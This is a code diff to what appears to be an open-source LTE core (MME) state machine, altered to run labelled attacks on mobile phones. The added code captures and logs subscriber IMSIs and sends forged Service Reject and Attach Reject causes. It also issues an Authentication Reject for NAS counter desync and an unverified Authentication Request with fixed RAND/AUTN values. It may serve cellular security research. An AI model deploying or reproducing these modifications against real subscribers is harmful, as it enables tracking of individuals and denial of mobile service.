@@ -353,16 +353,30 @@ static void common_register_state(ogs_fsm_t *s, mme_event_t *e,
                 == OGS_NAS_SECURITY_HEADER_FOR_SERVICE_REQUEST_MESSAGE) {
             ogs_info("[%s] Service request", mme_ue->imsi_bcd);
 
+            // if (state != EMM_COMMON_STATE_REGISTERED) {
+            //     ogs_info("Service request : Not registered[%s]",
+            //             mme_ue->imsi_bcd);
+            //     r = nas_eps_send_service_reject(enb_ue, mme_ue,
+            //         OGS_NAS_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
+            //     ogs_expect(r == OGS_OK);
+            //     ogs_assert(r != OGS_ERROR);
+            //     MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
+            //     break;
+            // }
+
+// MSA#8: Service Reject
+
             if (state != EMM_COMMON_STATE_REGISTERED) {
-                ogs_info("Service request : Not registered[%s]",
-                        mme_ue->imsi_bcd);
+                ogs_info("[MSA-8] Service request from unregistered UE -> Sending Service Reject Cause #15");
                 r = nas_eps_send_service_reject(enb_ue, mme_ue,
-                    OGS_NAS_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
+                                                OGS_NAS_EMM_CAUSE_NO_SUITABLE_CELLS_IN_TRACKING_AREA); // Cause #15
                 ogs_expect(r == OGS_OK);
                 ogs_assert(r != OGS_ERROR);
                 MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
                 break;
             }
+
+// END OF MSA#8
 
             rv = emm_handle_service_request(
                     enb_ue, mme_ue, &message->emm.service_request);
@@ -444,9 +458,6 @@ static void common_register_state(ogs_fsm_t *s, mme_event_t *e,
             rv = emm_handle_identity_response(enb_ue, mme_ue,
                     &message->emm.identity_response);
 
-            // PRINT IMSI TO LOG:
-            ogs_info(">>> [MSA-14 SUCCESS] Captured IMSI: %s <<<", mme_ue->imsi_bcd);
-
             if (rv != OGS_OK) {
                 ogs_error("emm_handle_identity_response() failed");
                 MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
@@ -459,7 +470,27 @@ static void common_register_state(ogs_fsm_t *s, mme_event_t *e,
                 break;
             }
 
-            mme_s6a_send_air(enb_ue, mme_ue, NULL);
+// MSA#14: IMSI CATCHING CONFIRM
+
+            // PRINT IMSI TO LOG:
+            ogs_info(">>> [MSA-14 SUCCESS] Captured IMSI: %s <<<", mme_ue->imsi_bcd);
+            break;
+
+// END OF MSA#14
+
+// MSA#15: NAS Counter Desync Attack (Auth Reject)
+// VARIANT A: Identity Response -> Authentication Reject
+
+            ogs_info(">>> [MSA-15] Sending Authentication Reject to IMSI: %s <<<", mme_ue->imsi_bcd);
+            r = nas_eps_send_authentication_reject(mme_ue);
+            ogs_expect(r == OGS_OK);
+            ogs_assert(r != OGS_ERROR);
+            MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
+            break;
+
+// END OF MSA#15
+
+            // mme_s6a_send_air(enb_ue, mme_ue, NULL);
 
             OGS_FSM_TRAN(s, &emm_state_authentication);
             break;
@@ -513,12 +544,40 @@ static void common_register_state(ogs_fsm_t *s, mme_event_t *e,
 
                 OGS_FSM_TRAN(s, &emm_state_initial_context_setup);
 
+            // } else {
+            //     mme_s6a_send_air(enb_ue, mme_ue, NULL);
+
+            //     OGS_FSM_TRAN(s, &emm_state_authentication);
+
+            // }
             } else {
-                mme_s6a_send_air(enb_ue, mme_ue, NULL);
 
+// MSA#15
+// VARIANT B: Auth Request -> Auth Failure -> Auth Reject
+
+                ogs_info("[MSA-15-Reshaped] Sending unverified Authentication Request to IMSI[%s]", mme_ue->imsi_bcd);
+                memset(mme_ue->rand, 0x11, OGS_RAND_LEN);
+                memset(mme_ue->autn, 0x22, OGS_AUTN_LEN);
+                r = nas_eps_send_authentication_request(mme_ue);
+                ogs_expect(r == OGS_OK);
                 OGS_FSM_TRAN(s, &emm_state_authentication);
+                break;
 
+// END OF MSA#15
+
+// MSA#2: Attach Reject
+
+                ogs_info("[MSA-2] Sending Attach Reject Cause #14 to IMSI[%s]", mme_ue->imsi_bcd);
+                r = nas_eps_send_attach_reject(enb_ue, mme_ue,
+                    OGS_NAS_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED_IN_THIS_PLMN, // Cause #14 (or OGS_NAS_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED for Cause #7)
+                    OGS_NAS_ESM_CAUSE_PROTOCOL_ERROR_UNSPECIFIED);
+                ogs_expect(r == OGS_OK);
+                MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
+                break;
             }
+
+// END OF MSA#2
+
             break;
 
         case OGS_NAS_EPS_TRACKING_AREA_UPDATE_REQUEST:
@@ -1195,12 +1254,6 @@ void emm_state_authentication(ogs_fsm_t *s, mme_event_t *e)
 
             OGS_FSM_TRAN(s, &emm_state_authentication);
             break;
-
-// MSA#2: Service Reject
-
-
-
-// END OF MSA#2
 
         case OGS_NAS_EPS_EMM_STATUS:
             ogs_warn("EMM STATUS : IMSI[%s] Cause[%d]",
